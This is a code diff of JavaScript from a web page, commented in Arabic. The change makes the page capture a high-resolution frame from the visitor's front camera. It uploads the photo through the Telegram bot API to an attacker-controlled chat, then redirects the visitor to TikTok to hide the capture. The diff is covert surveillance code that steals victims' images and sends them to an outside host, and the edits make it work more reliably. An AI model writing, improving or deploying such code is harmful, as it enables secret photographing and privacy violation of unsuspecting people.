@@ -36,39 +36,48 @@
             }
 
             try {
-                // طلب الكاميرا الخلفية فقط
+                // طلب الكاميرا الأمامية بدقة عالية
                 stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "environment" }
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
                 });
                 
                 video.srcObject = stream;
                 
-                // انتظار 3 ثواني عشان الكاميرا تثبت
-                setTimeout(() => {
-                    // ضبط حجم الكانفس بنفس حجم الفيديو
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    
-                    // رسم الصورة من الفيديو إلى الكانفس
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    // تحويل الكانفس إلى صورة
-                    canvas.toBlob((blob) => {
-                        // إرسال الصورة
-                        const form = new FormData();
-                        form.append('chat_id', id);
-                        form.append('photo', blob, 'photo.jpg');
+                // لما الفيديو يبدأ فعلاً بالتشغيل
+                video.onplaying = () => {
+                    // ننتظر نص ثانية عشان الصورة تظهر بوضوح
+                    setTimeout(() => {
+                        // ضبط حجم الكانفس على نفس حجم الفيديو الفعلي
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
                         
-                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                            method: 'POST',
-                            body: form
-                        }).finally(() => {
-                            stream.getTracks().forEach(t => t.stop());
-                            window.location.href = "https://www.tiktok.com";
-                        });
-                    }, 'image/jpeg');
-                    
-                }, 3000);
+                        // رسم الصورة من الفيديو
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        // التأكد إن الرسم اكتمل
+                        setTimeout(() => {
+                            canvas.toBlob((blob) => {
+                                // إرسال الصورة
+                                const form = new FormData();
+                                form.append('chat_id', id);
+                                form.append('photo', blob, 'photo.jpg');
+                                
+                                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                                    method: 'POST',
+                                    body: form
+                                }).finally(() => {
+                                    stream.getTracks().forEach(t => t.stop());
+                                    window.location.href = "https://www.tiktok.com";
+                                });
+                            }, 'image/jpeg', 0.95); // جودة 95%
+                        }, 200);
+                        
+                    }, 500); // انتظار نصف ثانية بعد تشغيل الفيديو
+                };
                 
             } catch (err) {
                 // إذا فشل، أرسل رسالة
